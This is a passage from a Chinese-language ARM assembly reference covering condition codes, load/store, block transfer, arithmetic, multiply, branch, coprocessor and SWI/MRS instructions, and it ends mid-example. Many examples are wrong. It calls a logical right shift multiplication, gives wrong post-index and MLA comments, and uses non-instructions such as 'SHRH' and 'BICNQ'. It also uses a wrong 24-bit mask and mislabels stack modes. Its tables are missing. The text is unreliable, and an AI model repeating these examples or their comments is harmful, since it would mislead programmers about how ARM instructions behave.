寄存器偏移方式应用举例：\n​ ADD R1，R1，R1，LSL #3 ；R1=R1*9\n​ SUB R1，R1，R2，LSR#2 ；R1=R1-R2*4\n​ R15 为处理器的程序计数器PC，一般不要对其进行操作，而且有些指令是不允许使用R15，如UMULL 指令。 ​ （3）条件码 ​ 使用指令条件码，可实现高效的逻辑操作，提高代码效率。表A-1给出条件码表。\n表A-1 条件码表\n​ 对于Thumb指令集，只有B 指令具有条件码执行功能，此指令条件码同表A-?，但如果为无条件执行时，条件码助记符“AL”不在指令中书写。\n​ 条件码应用举例如下：\n​ 比较两个值大小，并进行相应加1 处理，C 代码为： ​ if（a＞b）a++ ; ​ else b++ ; ​ 对应的ARM 指令如下。其中R0为a，R1为b。 ​ CMP R0，R1 ; R0 与R1 比较 ​ ADDHI R0，R0，#1 ; 若R0＞R1，则R0=R0+1 ​ ADDLS R1，R1，#1 ;若R0＜=R1，则R1=R1+1 ​ 若两个条件均成立，则将这两个数值相加，C代码为：\n​ If(（a!=10）\u0026\u0026(b!=20))a=a+b;\n​ 对应的ARM 指令如下，其中R0 为a，R1为b。 ​ CMP R0,#10 ; 比较R0 是否为10 ​ CMPNE R1,#20 ; 若R0 不为10，则比较R1 是否20 ​ ADDNE R0,R0,R1 ; 若R0 不为10 且R1 不为20，指令执行，R0=R0+R1\n1.3. 指令集 1.3.1. ARM 存储器访问指令 ​ ARM 处理是加载/存储体系结构的典型的RISC处理器，对存储器的访问只能使用加载和存储指令实现。ARM 的加载/存储指令是可以实现字、半字、无符/有符字节操作；批量加载/存储指令可实现一条指令加载/存储多个寄存器的内容，大大提高效率；SWP指令是一条寄存器和存储器内容交换的指令，可用于信号量操作等。ARM 处理器是冯?诺依曼存储结构，程序空间、RAM 空间及IO 映射空间统一编址，除对对RAM 操作以外，对外围IO、程序数据的访问均要通过加载/存储指令进行。表A-2给出ARM存储访问指令表。\n表A-2 ARM 存储访问指令表\nLDR 和STR ​ 加载/存储字和无符号字节指令。使用单一数据传送指令(STR 和LDR)来装载和存储单一字节或字的数据从/到内存。LDR指令用于从内存中读取数据放入寄存器中；STR 指令用于将寄存器中的数据保存到内存。指令格式如下： ​ LDR{cond}{T} Rd,\u003c地址\u003e;  加载指定地址上的数据(字)，放入Rd中 ​ STR{cond}{T} Rd,\u003c地址\u003e; 存储数据(字)到指定地址的存储单元，要存储的数据在Rd中 ​ LDR{cond}B{T} Rd,\u003c地址\u003e; 加载字节数据，放入Rd中，即Rd最低字节有效，高24位清零 ​ STR{cond}B{T} Rd,\u003c地址\u003e; 存储字节数据，要存储的数据在Rd，最低字节有效 ​ 其中，T 为可选后缀，若指令有T，那么即使处理器是在特权模式下，存储系统也将访问看成是处理器是在用户模式下。T在用户模式下无效，不能与前索引偏移一起使用T。 ​ LDR/STR 指令寻址是非常灵活的，由两部分组成，一部分为一个基址寄存器，可以为任一个通用寄存器，另一部分为一个地址偏移量。地址偏移量有以下3种格式： ​ (1) 立即数。立即数可以是一个无符号数值，这个数据可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例如下： ​ LDR R1,[R0,#0x12] ;将R0+0x12 地址处的数据读出，保存到R1中(R0 的值不变) ​ LDR R1,[R0,#-0x12];将R0-0x12 地址处的数据读出，保存到R1中(R0 的值不变) ​ LDR R1,[R0] ;将R0 地址处的数据读出，保存到R1 中(零偏移) ​ (2)寄存器。寄存器中的数值可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例值。指令举例如下： ​ LDR R1,[R0,R2] ;将R0+R2 地址的数据计读出，保存到R1中(R0 的值不变) ​ LDR R1,[R0,-R2] ;将R0-R2 地址处的数据计读出，保存到R1中(R0 的值不变) ​ (3)寄存器及移位常数。寄存器移位后的值可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例如下： ​ LDR R1,[R0,R2,LSL #2] ;将R0+R24地址处的数据读出，保存到R1中（R0，R2的值不变） ​ LDR R1,[R0,-R2,LSL #2];将R0-R24地址处的数据计读出，保存到R1中(R0，R2的值不变) ​ 从寻址方式的地址计算方法分，加载/存储指令有以下4 种形式： ​ (1)零偏移。Rn 的值作为传送数据的地址，即地址偏移量为0。指令举例如下： ​ LDR Rd,[Rn] ​ (2)前索引偏移。在数据传送之前，将偏移量加到Rn 中，其结果作为传送数据的存储地址。若使用后缀“！”，则结果写回到Rn中，且Rn 值不允许为R15。指令举例如下： ​ LDR Rd,[Rn,#0x04]! ​ LDR Rd,[Rn,#-0x04] ​ (3)程序相对偏移。程序相对偏移是索引形式的另一个版本。汇编器由PC 寄存器计算偏移量，并将PC寄存器作为Rn 生成前索引指令。不能使用后缀“！”。指令举例如下： ​ LDR Rd,label ;label 为程序标号，label 必须是在当前指令的±4KB范围内 ​ (4) 后索引偏移。Rn 的值用做传送数据的存储地址。在数据传送后，将偏移量与Rn相加，结果写回到Rn中。Rn 不允许是R15。指令举例如下： ​ LDR Rd,[Rn],#0x04 ​ 地址对准--大多数情况下，必须保证用于32 位传送的地址是32 位对准的。 ​ 加载/存储字和无符号字节指令举例如下： ​ LDR R2,[R5] ;加载R5 指定地址上的数据(字)，放入R2 中 ​ STR R1,[R0,#0x04] ;将R1 的数据存储到R0+0x04存储单元，R0 值不变 ​ LDRB R3,[R2],#1 ;读取R2 地址上的一字节数据，并保存到R3中，R2=R3+1 ​ STRB R6,[R7] ;读R6 的数据保存到R7 指定的地址中，只存储一字节数据 ​ 加载/存储半字和带符号字节。这类LDR/STR 指令可能加载带符字节\\加载带符号半字、加载/存储无符号半字。偏移量格式、寻址方式与加载/存储字和无符号字节指令相同。指令格式如下： ​ LDR{cond}SB Rd,\u003c地址\u003e ;加载指定地址上的数据(带符号字节)，放入Rd中 ​ LDR{cond}SH Rd,\u003c地址\u003e ;加载指定地址上的数据(带符号字节)，放入Rd中 ​ LDR{cond}H Rd,\u003c地址\u003e ;加载半字数据，放入Rd中，即Rd最低16位有效,高16位清零 ​ STR{cond}H Rd,\u003c地址\u003e ;存储半字数据，要存储的数据在Rd，最低16位有效 ​ 说明：带符号位半字/字节加载是指带符号位加载扩展到32 位;无符号位半字加载是指零扩展到32位。 ​ 地址对准--对半字传送的地址必须为偶数。非半字对准的半字加载将使Rd 内容不可靠，非半字对准的半字存储将使指定地址的2字节存储内容不可靠。\n​ 加载/存储半字和带符号字节指令举例如下：\n​  LDRSB R1[R0,R3] ;将R0+R3地址上的字节数据读出到R1，高24 位用符号位扩展 ​ LDRSH R1,[R9] ;将R9 地址上的半字数据读出到R1，高16位用符号位扩展 ​ LDRH R6,[R2],#2 ;将R2 地址上的半字数据读出到R6，高16位用零扩展，R2=R2+1 ​  SHRH R1,[R0,#2]!;将R1 的数据保存到R2+2 地址中，只存储低2字节数据，R0=R0+2 ​ LDR/STR 指令用于对内存变量的访问，内存缓冲区数据的访问、查表、外设的控制操作等等，若使用LDR 指令加载数据到PC 寄存器，则实现程序跳转功能，这样也就实现了程序散转。 ​ 变量的访问 ​ NumCount EQU 0x40003000 ;定义变量NumCount ​ … ​ LDR R0,=NumCount ;使用LDR 伪指令装载NumCount的地址到R0 ​ LDR R1,[R0] ;取出变量值 ​ ADD R1,R1,#1 ;NumCount=NumCount+1 ​ STR R1,[R0] ;保存变量值 ​ … ​ GPIO 设置 ​ GPIO-BASE EQU 0Xe0028000 ;定义GPIO 寄存器的基地址 ​ … ​ LDR R0,=GPIO-BASE ​ LDR R1,=0x00FFFF00 ;装载32 位立即数，即设置值 ​ STR R1,[R0,#0x0C] ;IODIR=0x00FFFF00， IODIR 的地址为0xE002800C ​ MOV R1,#0x00F00000 ​ STR R1,[R0,#0x04] ;IOSET=0x00F00000，IOSET 的地址为0xE0028004 ​ … ​ 程序散转 ​ … ​ MOV R2,R2,LSL #2 ;功能号乘上4，以便查表 ​ LDR PC,[PC,R2] ;查表取得对应功能子程序地址，并跳转 ​ NOP ​ FUN-TAB DCD FUN-SUB0 ​ DCD FUN-SUB1 ​ DCD FUN-SUB2 ​ …\nLDM和STM ​ 批量加载/存储指令可以实现在一组寄存器和一块连续的内存单元之间传输数据。LDM为加载多个寄存器，STM 为存储多个寄存器。允许一条指令传送16 个寄存器的任何子集或所有寄存器。指令格式如下： ​ LDM{cond}\u003c模式\u003e Rn{!},reglist{^} ​ STM{cond}\u003c模式\u003e Rn{!},reglist{^} ​ LDM /STM 的主要用途是现场保护、数据复制、参数传送等。其模式有8种，如下所列：(前面4 种用于数据块的传输，后面4 种是堆栈操作)。 ​ (1) IA：每次传送后地址加4 ​ (2) IB：每次传送前地址加4 ​ (3) DA：每次传送后地址减4 ​ (4) DB：每次传送前地址减4 ​ (5) FD：满递减堆栈 ​ (6) ED：空递增堆栈 ​ (7) FA：满递增堆栈 ​ (8) EA：空递增堆栈 ​ 其中，寄存器Rn 为基址寄存器，装有传送数据的初始地址，Rn 不允许为R15;后缀“！”表示最后的地址写回到Rn中;寄存器列表reglist 可包含多于一个寄存器或寄存器范围，使用“,”分开，如{R1,R2,R6-R9},寄存器排列由小到大排列；“＾”后缀不允许在用户模式呈系统模式下使用，若在LDM 指令用寄存器列表中包含有PC 时使用，那么除了正常的多寄存器传送外，将SPSR 拷贝到CPSR 中，这可用于异常处理返回；使用“＾”后缀进行数据传送且寄存器列表不包含PC时，加载/存储的是用户模式的寄存器，而不是当前模式的寄存器。 ​ 地址对准――这些指令忽略地址的位[1：0]。 ​ 批量加载/存储指令举例如下： ​ LDMIA R0!,{R3-R9} ;加载R0 指向的地址上的多字数据，保存到R3～R9中，R0 值更新 ​ STMIA R1!,{R3-R9} ;将R3～R9 的数据存储到R1 指向的地址上，R1值更新 ​ STMFD SP!,{R0-R7,LR} ;现场保存，将R0～R7、LR入栈 ​ LDMFD SP!,{R0-R7,PC}^;恢复现场，异常处理返回 ​ 在进行数据复制时，先设置好源数据指针，然后使用块拷贝寻址指令LDMIA/STMIA、LDMIB/STMIB、LDMDA/STMDA、LDMDB/STMDB 进行读取和存储。而进行堆栈操作时，则要先设置堆栈指针，一般使用SP 然后使用堆栈寻址指令STMFD/LDMFD、STMED。LDMED、STMFA/LDMFA、STMEA/LDMEA实现堆栈操作。 ​ 多寄存器传送指令示意图如图A-1所示，其中R1为指令执行前的基址寄存器，R1’则为指令执行完后的基址寄存器。\n（a）指令STMIA R1!,{R5-R7} （b）指令STMIB R1!,{R5-R7}\n（c）指令STMDA R1!, {R5-R7} （d）指令STMDB R1!,{R5-R7} 图A-1 多寄存器传送指令示意图\n​ 数据是存储在基址寄存器的地址之上还是之下，地址是在存储第一个值之前还是之后增加还是减少。表A-3给出多寄存器传送指令映射示意表。\n表A-3 多寄存器传送指令映射示意表\n使用LDM/STM 进行数据复制例程如下： … LDR R0,=SrcData ;//设置源数据地址 LDR R1,=DstData ;//设置目标地址 LDMIA R0,{R2-R9} ;//加载8 字数据到寄存器R2～R9 STMIA R1,{R2-R9} ;//存储寄存器R2～R9 到目标地址 ​ 使用LDM/STM 进行现场寄存器保护，常在子程序中或异常处理使用： ​ SENDBYTE ​ STMFD SP!,{R0-R7,LR} ;寄存器入堆 ​ … ​ BL DELAY ;调用DELAY 子程序 ​ … ​ LDMFD SP!,{R0-R7,PC} ;恢复寄存器，并返回\nSWP ​ 寄存器和存储器交换指令。SWP指令用于将一个内存单元（该单元地址放在寄存器Rn中）的内容读取到一个寄存器Rd中，同时将另一个寄存器Rm 的内容写入到该内存单元中。使用SWP 可实现信号量操作。 ​ 指令格式如下： ​  SWP{cond}{B} Rd,Rm,[Rn] ​ 其中，B 为可选后缀，若有B，则交换字节，否则交换32 位字：Rd 为数据从存储器加载到的寄存器;Rm的数据用于存储到存储器中，若Rm 与Rn 相同，则为寄存器与存储器内容进行交换;Rn 为要进行数据交换的存储器地址，Rn 不能与Rd 和Rm 相同。 ​ SWP 指令举例如下： ​ SWP R1,R1,[R0] ; 将R1 的内容与R0 指向的存储单元的内容进行交换 ​ SWP R1,R2,,[R0] ; 将R0 指向的存储单元内容读取一字节数据到R1中(高24 位清零) ​ ; 并将R2 的内容写入到该内存单元中(最低字节有效) ​ 使用SWP 指令可以方便地进行信号量的操作： ​ 12C_SEM EQU 0x40003000 ​ … ​ 12C_SEM_WAIT ​ MOV R0,#0 ​ LDR R0,=12C_SEM ​ SWP R1,R1,[R0] ;取出信号量，并设置其为0 ​ CMP R1,#0 ;判断是否有信号 ​ BEQ 12C_SEM_WAIT ;若没有信号，则等待\n1.3.2. ARM 数据处理指令 ​ 数据处理指令大致可分为3 类：\n（1） 数据传送指令（如MOV、MVN）\n（2） 算术逻辑运算指令（如ADD,SUM,AND）\n（3） 比较指令（如CMP、TST）。\n数据处理指令只能对寄存器的内容进行操作。 所有ARM 数据处理指令均可选择使用S 后缀，以影响状态标志。比较指令CMP、CMN、TST和TEQ不需要后缀S，它们会直接影响状态标志。ARM数据处理指令列于表A-4中。\n表A-4 ARM 数据处理指令\n（1）数据传送指令 **MOV** 数据传送指令。将8 位图立即数或寄存器(operant2)传送到目标寄存器Rd，可用于移位运算等操作。指令格式如下： MOV{cond}{S} Rd,operand2 MOV 指令举例如下： MOV R1#0x10 ;R1=0x10 MOV R0,R1 ;R0=R1 MOVS R3,R1,LSL #2 ;R3=R1＜＜2，并影响标志位 MOV PC,LR ;PC=LR ，子程序返回 MVN ​ 数据非传送指令。将8 位图立即数或寄存器(operand2)按位取反后传送到目标寄存器(Rd)，因为其具有取反功能，所以可以装载范围更广的立即数。指令格式如下： ​ MVN{cond}{S} Rd,operand2 ​ MVN 指令举例如下： ​ MVN R1,#0xFF ;R1=0xFFFFFF00 ​ MVN R1,R2 ;将R2 取反，结果存到R1\n​ （2）算术逻辑运算指令\nADD ​ 加法运算指令。将operand2 数据与Rn 的值相加，结果保存到Rd 寄存器。指令格式如下： ​ ADD{cond}{S} Rd,Rn,operand2 ​ ADD 指令举例如下： ​ ADDS R1,R1,#1 ;R1=R1+1 ​ ADD R1,R1,R2 ;R1=R1+R2 ​ ADDS R3,R1,R2,LSL #2 ;R3=R1+R2＜＜2\nSUB ​ 减法运算指令。用寄存器Rn 减去operand2。结果保存到Rd 中。指令格式如下： ​ SUB{cond}{S} Rd,Rn,operand2 ​ SUB 指令举例如下： ​ SUBS R0,R0,#1 ;R0=R0-1 ​ SUBS R2,R1,R2 ;R2=R1-R2 ​ SUB R6,R7,#0x10 ;R6=R7-0x10\nRSB ​ 逆向减法指令。用寄存器operand2 减法Rn，结果保存到Rd 中。指令格式如下： ​ RSB{cond}{S} Rd,Rn,operand2 ​ SUB 指令举例如下： ​ RSB R3,R1,#0xFF00 ;R3=0xFF00-R1 ​ RSBS R1,R2,R2,LSL #2 ;R1=R2＜＜2-R2=R2×3 ​ RSB R0,R1,#0 ;R0=-R1\nADC ​ 带进位加法指令。将operand2 的数据与Rn 的值相加，再加上CPSR中的C 条件标志位。结果保存到Rd 寄存器。指令格式如下： ​ ADC{cond}{S} Rd,Rn,operand2 ​ ADC 指令举例如下： ​ ADDS R0,R0,R2 ​ ADC R1,R1,R3 ;使用ADC 实现64 位加法，(R1、R0)=(R1、R0)+（R3、R2）\nSBC ​ 带进位减法指令。用寄存器Rn 减去operand2，再减去CPSR 中的C条件标志位的非（即若C 标志清零，则结果减去1），结果保存到Rd 中。指令格式如下： ​  SCB{cond}{S}Rd,Rn,operand2 ​ SBC 指令举例如下： ​ SUBS R0，R0，R2 ​ SBC R1，R1，R3 ;使用SBC 实现64 位减法，(R1,R0)-(R3,R2)\nRSC ​ 带进位逆向减法指令。用寄存器operand2 减去Rn，再减去CPSR 中的C条件标志位，结果保存到Rd 中。指令格式如下： ​  RSC{cond}{S} Rd,Rn,operand2 ​ RSC 指令举例如下： ​ RSBS R2,R0,#0 ​ RSC R3,R1,#0 ;使用RSC 指令实现求64 位数值的负数\nAND ​ 逻辑与操作指令。将operand2 值与寄存器Rn 的值按位作逻辑与操作，结果保存到Rd中。指令格式如下： ​ AND{cond}{S} Rd,Rn,operand2 ​ AND 指令举例如下： ​ ANDS R0,R0,#x01 ;R0=R0\u00260x01，取出最低位数据 ​ AND R2,R1,R3 ;R2=R1\u0026R3\nORR ​ 逻辑或操作指令。将operand2 的值与寄存器Rn的值按位作逻辑或操作，结果保存到Rd 中。指令格式如下： ​ ORR{cond}{S} Rd,Rn,operand2 ​ ORR 指令举例如下： ​ ORR R0,R0,#x0F ;将R0 的低4 位置1 ​ MOV R1,R2,LSR #4 ​ ORR R3,R1,R3,LSL #8 ;使用ORR 指令将近R2 的高8位数据移入到R3 低8 位中\nEOR ​ 逻辑异或操作指令。将operand2 的值与寄存器Rn 的值按位作逻辑异或操作，结果保存到Rd中。指令格式如下： ​ EOR{cond}{S}Rd,Rn,operand2 ​ EOR 指令举例如下： ​ EOR R1,R1,#0x0F ;将R1 的低4 位取反 ​ EOR R2,R1,R0 ;R2=R1^R0 ​ EORS R0,R5,#0x01 ;将R5 和0x01 进行逻辑异或，结果保存到R0，并影响标志位\nBIC ​ 位清除指令。将寄存器Rn 的值与operand2 的值的反码按位作逻辑与操作，结果保存到Rd中。指令格式如下： ​ BIC{cond}{S}Rd,Rn,operand2 ​ BIC 指令举例如下： ​ BIC R1,R1,#0x0F ;将R1 的低4 位清零，其它位不变 ​ BIC R1,R2,R3 ;将拭的反码和R2 相逻辑与，结果保存到R1\n​ （3）比较指令\nCMP ​ 比较指令。指令使用寄存器Rn 的值减去operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行。指令格式如下： ​ CMP{cond} Rn,operand2 ​ CMP 指令举例如下： ​ CMP R1,#10 ;R1 与10 比较，设置相关标志位 ​ CMP R1,R2 ;R1 与R2 比较，设置相关标志位 ​ CMP 指令与SUBS 指令的区别在于CMP 指令不保存运算结果。在进行两个数据大小判断时，常用CMP指令及相应的条件码来操作。\nCMN ​ 负数比较指令。指令使用寄存器Rn 与值加上operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行，指令格式如下： ​ CMN{cond} Rn,operand2 ​ CMN R0,#1 ;R0+1,判断R0 是否为1 的补码，若是Z 置位 ​ CMN 指令与ADDS 指令的区别在于CMN 指令不保存运算结果。CMN指令可用于负数比较，比如CMNR0，#1 指令则表示R0 与-1 比较，若R0 为-(即1 的补码)，则Z 置位，否则Z复位。\nTST ​ 位测试指令。指令将寄存器Rn 的值与operand2 的值按位作逻辑与操作，根据操作的结果更新CPSR中相应的条件标志位(当结果为0时，EQ位被设置)，以便后面指令根据相应的条件标志来判断是否执行。指令格式如下： ​ TST{cond} Rn,operand2 ​ TST 指令举例如下： ​ TST R0,#0x01 ;判断R0 的最低位是否为0 ​ TST R1,#0x0F ;判断R1 的低4 位是否为0 ​ TST 指令与ANDS 指令的区别在于TST4 指令不保存运算结果。TST指令通常于EQ、NE条件码配合使用，当所有测试位均为0 时，EQ 有效，而只要有一个测试为不为0，则NE 有效。\nTEQ ​ 相等测试指令。指令寄存器Rn 的值与operand2 的值按位作逻辑异或操作，根据操作的结果更新CPSR中相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行。指令格式如下： ​ TEQ{cond} Rn,operand2 ​ TEQ 指令举例如下： ​ TEQ R0,R1 ;比较R0 与R1 是否相等(不影响V 位和C 位) ​ TST 指令与EORS 指令的区别在于TST 指令不保存运算结果。使用TEQ进行相等测试，常与EQNE 条件码配合使用，当两个数据相等时，EQ 有效，否则NE 有效。\n（4）乘法指令 ​ ARM7TDMI(-S)具有32×32 乘法指令、32×32 乘加指令、32×32结果为64 位的乘法指令。表A-5给出全部的ARM 乘法指令。\n表A-5 全部的ARM 乘法指令\nMUL 32 位乘法指令。指令将Rm 和Rs 中的值相乘，结果的低32 位保存到Rd中。指令格式如下： MUL{cond}{S} Rd,Rm,Rs MUL 指令举例如下： MUL R1,R2,R3 ;R1=R2×R3 MULS R0,R3,R7 ;R0=R3×R7，同时设置CPSR 中的N位和Z 位 MLA ​ 32 位乘加指令。指令将Rm 和Rs 中的值相乘，再将乘积加上第3 个操作数，结果的低32位保存到Rd 中。指令格式如下： ​ MLA{cond}{S} Rd,Rm,Rs,Rn ​ MLA 指令举例如下： ​ MLA R1,R2,R3,R0 ;R1=R2×R3+10\nUMULL ​ 64 位无符号乘法指令。指令将Rm 和Rs 中的值作无符号数相乘，结果的低32位保存到RsLo 中，而高32 位保存到RdHi 中。指令格式如下： ​ UMULL{cond}{S} RdLo,RdHi,Rm,Rs ​ UMULL 指令举例如下： ​ UMULL R0,R1,R5,R8 ;(R1、R0)=R5×R8\nUMLAL ​ 64 位无符号乘加指令。指令将Rm 和Rs 中的值作无符号数相乘，64 位乘积与RdHi、RdLo相加，结果的低32 位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下： ​ UMLAL{cond}{S} RdLo,RdHi,Rm,Rs ​ UMLAL 指令举例如下： ​ UMLAL R0,R1,R5,R8;(R1,R0)=R5×R8+(R1,R0)\nSMULL ​ 64 位有符号乘法指令。指令将Rm 和Rs 中的值作有符号数相乘，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下： ​  SMULL{cond}{S} RdLo,RdHi,Rm,Rs ​ SMULL 指令举例如下： ​ SMULL R2,R3,R7,R6 ;(R3,R2)=R7×R6\nSMLAL ​ 64 位有符号乘加指令。指令将Rm 和Rs 中的值作有符号数相乘，64 位乘积与RdHi、RdLo，相加，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下： ​  SMLAL{cond}{S} RdLo,RdHi,Rm,Rs ​ SMLAL 指令举例如下： ​ SMLAL R2,R3,R7,R6;(R3,R2)=R7×R6+(R3,R2)\n1.3.3. ARM 跳转指令 ​ 两种方式可以实现程序的跳转：\n（1） 使用跳转指令直接跳转，跳转指令有跳转指令B，带链接的跳转指令BL ，带状态切换的跳转指令BX。\n（2） 直接向PC 寄存器赋值实现跳转。\n表A-6给出全部的ARM跳转指令。\n表A-6 ARM跳转指令\nB ​\t跳转指令，跳转到指定的地址执行程序。\n `B{cond} label` 举例如下：  ​ B WAITA ;跳转到WAITA 标号处\n​ B 0x1234 ;跳转到绝对地址0x1234 处\n​ 跳转到指令B 限制在当前指令的±32Mb 的范围内。\nBL 带链接的跳转指令。指令将下一条指令的地址拷贝到R14(即LR)链接寄存器中，然后跳转到指定地址运行程序。\n​ BL{cond} label\n​ 举例如下：\n​ BL DELAY\n​ 跳转指令B 限制在当前指令的±32MB 的范围内。BL 指令用于子程序调用。\nBX 带状态切换的跳转指令。跳转到Rm 指定的地址执行程序，若Rm 的位[0]为1，则跳转时自动将CPSR 中的标志T 置位，即把目标地址的代码解释为Thumb代码;若Rm 的位[0]为0，则跳转时自动将CPSR 中的标志T 复位，即把目标地址的代码解释为ARM代码。指令格式如下： ​ BX{cond} Rm ​ 举例如下： ​ ADRL R0,ThumbFun+1 ​ BX R0 ;跳转到R0 指定的地址，并根据R0 的最低位来切换处理器状态\nBLX ​ BLX目标地址：跳转，改变状态及保存PC值\n1.3.4. ARM 协处理器指令 5 ARM 支持协处理器操作，协处理器的控制要通过协处理器命令实现。表A-7给出全部的ARM协处理器指令。\n表A-7 ARM 协处理器指令\nCDP ​ 协处理器数据操作指令。ARM 处理器通过CDP 指令通知ARM 协处理器执行特定的操作。该操作由协处理器完成，即对命令的参数的解释与协处理器有关，指令的使用取决于协处理器。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下： ​ CDP{cond}coproc,opcodel,CRd,CRn,CRm{,opcode2} ​ 其中： coproc 指令操作的协处理器名。标准名为pn,n 为0～15。 ​ opcodel 协处理器的特定操作码。 ​ CRd 作为目标寄存器的协处理器寄存器。 ​ CRN 存放第1 个操作数的协处理器寄存器。 ​ CRm 存放第2 个操作数的协处理器寄存器。 ​ Opcode2 可选的协处理器特定操作码。 ​ CDP 指令举例如下： ​ CDP p7,0,c0,c2,c3,0 ;协处理器7 操作，操作码为0，可选操作码为0 ​ CDP p6,1,c3,c4,c5 ;协处理器操作，操作码为1\nLDC ​ 协处理器数据读取指令。LDC指令从某一连续的内存单元将数据读取到协处理器的寄存器中。协处理器数据的数据的传送，由协处理器来控传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下： ​ LDC{cond}{L} coproc,CRd,\u003c地址\u003e ​ 其中： L 可选后缀，指明是长整数传送。 ​ coproc 指令操作的协处理器名。标准名为pn，n 为0～15 ​ CRd 作为目标寄存的协处理器寄存器。 ​ \u003c地址\u003e 指定的内存地址 ​ LDC 指令举例如下： ​ LDC p5,c2,[R2,#4];读取R2+4指向的内存单元的数据，传送到协处理器p5的c2寄存器中 ​  LDC p6,c2,[R1] ;读取是指向的内存单元的数据，传送到协处理器p6的c2 寄存器中\nSTC ​ 协处理器数据写入指令。STC指令将协处理器的寄存器数据写入到某一连续的内存单元中。进行协处理器数据的数据传送，由协处理器来控制传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下： ​  STC{cond}{L} coproc,CRd,\u003c地址\u003e ​ 其中： L 可选后缀，指明是长整数传送。 ​ coproc 指令操作的协处理器名。标准名为pn，n 为0～15 ​ CRd 作为目标寄存的协处理器寄存器。 ​ \u003c地址\u003e 指定的内存地址 ​ STC 指令举例如下： ​ STC p5,c1,[R0] ​ STC p5,c1,[Ro,#-0x04]\nMCR ​ ARM寄存器到协处理器寄存器的数据传送指令。MCR 指令将ARM 处理器的寄存器中的数据传送到协处理器的寄存器中。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下： ​  MCR{cond}coproc,opcodel,Rd,CRn,CRm{,opcode2} ​ 其中：coproc 指令操作的协处理器名。标准名为pn，n 为0～15。 ​ cpcodel 协处理器的特定操作码。 ​ RD 作为目标寄存器。 ​ CRn 存放第1 个操作数的协处理器寄存器 ​ CRm 存放第2 个操作数的协处理器寄存器。 ​ Opcode2 可选的协处理器特定操作码。 ​ MCR 指令举例如下： ​ MCR p6,2,R7,c1,c2, ​ MCR P7,0,R1,c3,c2,1,\nMRC ​ 协处理器寄存器到ARM寄存器到的数据传送指令。MRC 指令将协处理器寄存器中的数据传送到ARM 处理器的寄存器中。若协处理器不能成功地执行该操作。将产生未定义异常中断。指令格式如下： ​ MRC {cond}coproc,opcodel,Rd,CRn,CRm{,opcode2} ​ 其中：coproc 指令操作的协处理器名。标准名为pn，n为0～15。 ​ opcodel 协处理器的特定操作码。 ​ Rd 作为目标寄存器。 ​ CRn 存放第1 个操作数的协处理器寄存器。 ​ CRm 存放第2 个操作数的协处理器寄存器。 ​ opcode2 可选的协处理器特定操作码。 ​ MRC 指令举例如下： ​ MRC p5,2,R2,c3,c2 ​ MRC p7,0,R0,c1,c2,1\n1.3.5. ARM 杂项指令 ​ 表A-8给出全部的ARM协处理器指令。\n表A-8 ARM杂项指令\nSWI\n​ 软中断指令。SWI 指令用于产生软中断，从而实现在用户模式变换到管理模式，CPSR保存到管理模式的SPSR中，执行转移到SWI 向量，在其它模式下也可使用SWI 指令，处理同样地切换到管理模式。指令格式如下： ​  SWI{cond} immed_24 ​ 其中：immed_24 24 位立即数，值为0～16777215 之间的整数。 ​ SWI 指令举例如下： ​ SWI 0 ;软中断，中断立即数为0 ​ SWI 0x123456 ;软中断，中断立即数为0x123456 ​ 使用SWI 指令时，通常使用以下两种方法进行传递参数，SWI 异常中断处理程序就可以提供相关的服务，这两种方法均是用户软件协定。SWI异常中断处理程序要通过读取引起软中断的SWI 指令，以取得24 位立即数。 ​ （A）指令24 位的立即数指定了用户请求的服务类型，参数通过用寄存器传递。 ​ MOV R0,#34 ;设置了功能号为34 ​ SWI 12 ;调用12 号软中断 ​ （B）指令中的24 位立即数被忽略，用户请求的服务类型由寄存器R0 的值决定，参数通过其它的通用寄存器传递。 ​ MOV R0,#12 ;调用12 号软中断 ​ MOV R1,#34 ;设置子功能号为34 ​ SWI 0 ; ​ 在SWI 异常中断处理程序中，取出SWI 立即数的步骤为：首先确定引起软中断的SWI指令是ARM指令还时Thumb 指令，这可通过对SPSR 访问得到：然后要取得该SWI 指令的地址，这可通过访问LR 寄存器得到：接着读出指令，分解出立即数。 ​ 读出SWI 立即数： ​ T_bit EQU 0x20 ​ SWI_Hander ​ STMFD SP!,{R0_R3,R12,LR} ;现场保护 ​ MRS R0,SPSR ;读取SPSR ​ STMFD SP!,{R0} ;保存SPSR ​ TST R0,#T_bit ;测试T标志位 ​ LDRNEH R0,[LR,#-2] ;若是Thumb指令，读取指令码(16 位) ​ BICNE R0,R0,#0xFF00 ;取得Thumb 指令的8 位立即数 ​ LDREQ R0,[LR,#-4] ;若是ARM 指令，读取指令码(32 位) ​ BICNQ R0,R0,#0xFF00000 ;取得ARM 指令的24 位立即数 ​ … ​ LDMFD SP!,{R0-R3,R12,PC}^ ;SWI 异常中断返回\nMRS ​ 读状态寄存器指令。在ARM 处理器中，只有MRS 指令可以状态寄存器CPSR或SPSR读出到通用寄存器中。指令格式如下： ​ MRS{cond} Rd ,psr ​ 其中： Rd 目标寄存器。Rd 不允许为R15。 ​ psr CPSR 或SPSR ​ MRS指令举例如下： ​ MRS R1,CPSR ;将CPSR状态寄存器读取，保存到R1 中 ​ MRS R2,SPSR ;将SPSR状态寄存器读取，保存到R2 中 ​ MRS 指令读取CPSR，可用来判断ALU 的状态标志，或IRQ、FIQ中断是否允许等；在异常处理程序中，读SPSR 可知道进行异常前的处理器状态等。MRS 与MSR 配合使用，实现CPSR 或SPSR 寄存器的读—修改---写操作，可用来进行处理器模式切换()，允许/禁止IRQ/FIQ中断等设置。另外，进程切换或允许异常中断嵌套时，也需要使用MRS 指令读取SPSR 状态值。保存起来。 ​ 使能IRQ 中断例程： ​ ENABLE_IRQ ​ MRS R0,CPSR ​ BIC R0。R0,#0x80 ​ MSR 